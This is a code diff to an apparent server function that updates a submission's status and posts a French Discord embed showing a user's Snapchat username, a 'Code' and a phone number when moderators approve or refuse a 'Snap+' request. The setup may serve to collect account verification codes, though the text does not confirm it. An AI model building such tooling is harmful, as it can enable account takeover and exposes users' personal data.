@@ -97,19 +97,38 @@ serve(async (req) => {
       .update({ status: newStatus })
       .eq('id', submissionId);
 
-    const statusEmoji = action === 'approve' ? '✅' : '❌';
-    const statusText = action === 'approve' ? 'APPROUVÉ' : 'REFUSÉ';
-    const color = action === 'approve' ? 0x22C55E : 0xEF4444;
+    const isApproved = action === 'approve';
+    const statusEmoji = isApproved ? '✅' : '❌';
+    const statusText = isApproved ? 'APPROUVÉ' : 'REFUSÉ';
+    const color = isApproved ? 0x22C55E : 0xEF4444;
+    const description = isApproved 
+      ? "L'utilisateur a été validé avec succès ! Snap+ est maintenant actif."
+      : "La demande a été refusée. L'utilisateur devra réessayer.";
+
+    // Formater le numéro de téléphone
+    const formatPhone = (p: string) => {
+      const clean = p.replace(/^0/, '');
+      return clean.replace(/(\d{1})(\d{2})(\d{2})(\d{2})(\d{2})/, '$1 $2 $3 $4 $5');
+    };
 
     const updatedEmbed = {
-      title: `${statusEmoji} ${statusText}`,
+      title: `${statusEmoji} Demande ${statusText}`,
+      description: description,
       color: color,
+      thumbnail: {
+        url: "https://upload.wikimedia.org/wikipedia/fr/a/ad/Logo-Snapchat.png"
+      },
       fields: [
-        { name: "👤 Nom d'utilisateur", value: submission.username, inline: false },
-        { name: "🔢 Code", value: `\`${submission.code}\``, inline: true },
-        { name: "📞 Téléphone", value: `+33${submission.phone}`, inline: false },
+        { name: "👤 Nom d'utilisateur", value: `\`${submission.username}\``, inline: true },
+        { name: "🔢 Code", value: `\`${submission.code || 'N/A'}\``, inline: true },
+        { name: "📞 Téléphone", value: `+33 ${formatPhone(submission.phone)}`, inline: false },
       ],
-      footer: { text: `Traité par ${interaction.member?.user?.username || 'Modérateur'}` },
+      footer: { 
+        text: `Traité par ${interaction.member?.user?.username || 'Modérateur'}`,
+        icon_url: isApproved 
+          ? "https://cdn-icons-png.flaticon.com/512/845/845646.png"
+          : "https://cdn-icons-png.flaticon.com/512/753/753345.png"
+      },
       timestamp: new Date().toISOString(),
     };
 
